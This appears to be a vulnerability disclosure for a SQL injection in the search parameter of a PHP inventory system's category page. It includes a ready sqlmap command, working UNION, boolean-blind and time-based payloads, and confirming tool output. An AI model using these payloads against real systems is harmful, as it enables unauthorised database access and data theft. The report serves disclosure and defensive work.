# SQL Injection in Inventory System (View Category)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Category View (`view_category.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `view_category.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the category list page). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Navigate**: Go to the Category List page (`/view_category.php`).
4. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/view_category.php" \
--data "searchtxt=test&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
searchtxt=test%' UNION ALL SELECT CONCAT(0x717a706b71,0x465864524e435543554d7a7752444e47494378686f63635149775668734c676f70416773416e4768,0x716a766b71),NULL,NULL#&Search=Search

```

**Boolean-based Blind Payload:**

```sql
searchtxt=test%' AND 3898=3898#&Search=Search

```

**Time-based Blind Payload:**

```sql
searchtxt=test%' AND (SELECT 9457 FROM (SELECT(SLEEP(5)))bddE) AND 'gein%'='gein&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=test%' AND 3898=3898#&Search=Search
    Vector: AND [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=test%' AND (SELECT 9457 FROM (SELECT(SLEEP(5)))bddE) AND 'gein%'='gein&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchtxt=test%' UNION ALL SELECT CONCAT(0x717a706b71,0x465864524e435543554d7a7752444e47494378686f63635149775668734c676f70416773416e4768,0x716a766b71),NULL,NULL#&Search=Search
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```
<img width="1058" height="417" alt="图片" src="https://github.com/user-attachments/assets/ec3cd5e6-951e-4789-9aca-d83518ea52b6" />
<img width="906" height="569" alt="图片" src="https://github.com/user-attachments/assets/c2b4c170-308f-4c60-9fbb-479422ce1a18" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display the entire database content (categories, and potentially other tables via UNION) via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html

```
